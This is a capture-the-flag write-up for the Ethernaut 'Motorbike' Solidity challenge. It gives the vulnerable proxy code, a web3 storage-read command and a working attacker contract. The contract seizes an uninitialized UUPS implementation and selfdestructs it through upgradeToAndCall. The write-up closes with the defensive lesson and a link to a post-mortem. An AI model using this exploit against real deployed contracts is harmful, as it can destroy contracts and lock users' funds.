# Motorbike

## Challenge Description

Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to `selfdestruct` its engine and make the motorbike unusable ?

Things that might help:

-   [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)
-   [UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) upgradeable pattern
-   [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "./utils/Address.sol";
import "./utils/Initializable.sol";

contract Motorbike {
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    constructor(address _logic) public {
        require(
            Address.isContract(_logic),
            "ERC1967: new implementation is not a contract"
        );
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success, ) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    function _delegate(address implementation) internal virtual {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(
                gas(),
                implementation,
                0,
                calldatasize(),
                0,
                0
            )
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    function _getAddressSlot(
        bytes32 slot
    ) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success, ) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    function _setImplementation(address newImplementation) private {
        require(
            Address.isContract(newImplementation),
            "ERC1967: new implementation is not a contract"
        );

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

## Challenge Solution Walkthrough

In this challenge, the objective is to call the `selfdestruct()` function on the `Engine` contract. However, the `Engine` contract itself does not contain a `selfdestruct()` function. To achieve this, we need to call `selfdestruct()` from another contract. The approach involves using the `upgradeToAndCall()` function to upgrade to a contract that does have a `selfdestruct()` function and then invoke that function.

To call the `upgradeToAndCall()` function, we need to satisfy the `_authorizeUpgrade()` function's requirement, where `msg.sender` must be equal to the `upgrader` address. Thus, we have to change the `upgrader` to our own account/contract. The `initialize()` function can change the `upgrader` to `msg.sender`, but it has the `initializer` modifier, which allows it to be called only once. This function is invoked from the `Motorbike` contract, but it uses `delegatecall()`. When `delegatecall()` is used to call the `initialize()` function, it executes in the context of the `Motorbike` contract, not the `Engine` contract.

To become the `upgrader`, we need to directly call the `initialize()` function of the `Engine` contract. To do this, we must find the address of the `Engine` contract. It is stored at the address `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`, referred to as `_IMPLEMENTATION_SLOT`. We can use the following command to obtain the address:

```javascript
> await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
< '0x0000000000000000000000009c999d8ff8582881a7fa11f3072c093e971b9c4d'
```

Now, we can see that the address of the `Engine` contract is `0x9c999d8ff8582881a7fa11f3072c093e971b9c4d`. Now, we deploy the contract below, and pass the found address to the `constructor()` of the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "./Motorbike.sol";

contract MotorbikeSolution {
    Motorbike public motorbike;
    Engine public engine;

    constructor(address engineAddress) public {
        engine = Engine(engineAddress);
    }

    function solveChallenge() public {
        engine.initialize();
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("suicideMe()")
        );
    }

    function suicideMe() public {
        selfdestruct(msg.sender);
    }
}
```

When we call the `solveChallenge()` function, it calls the `initialize()` function of the `Engine` contract, and this contract becomes the `upgrader` of the `Engine` contract. Then, it calls `upgradeToAndCall()` function, and as the first parameter it sends its address to become the upgraded contract, and as the second argument it passes the function selector of the `suicideMe()` function to be called. `suicideMe()` is another function defined in the contract which calls `selfdestruct()`. Since `Engine` function uses `delegatecall()` to interact with this contract, by calling `suicideMe()`, the `Engine` function destroys itself.

## Challenge Description After Solving

The advantage of following an UUPS pattern is to have very minimal proxy to be deployed. The proxy acts as storage layer so any state modification in the implementation contract normally doesn't produce side effects to systems using it, since only the logic is used through delegatecalls.

This doesn't mean that you shouldn't watch out for vulnerabilities that can be exploited if we leave an implementation contract uninitialized.

This was a slightly simplified version of what has really been discovered after months of the release of UUPS pattern.

Takeways: never leave implementation contracts uninitialized ;)

If you're interested in what happened, read more [here](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680).
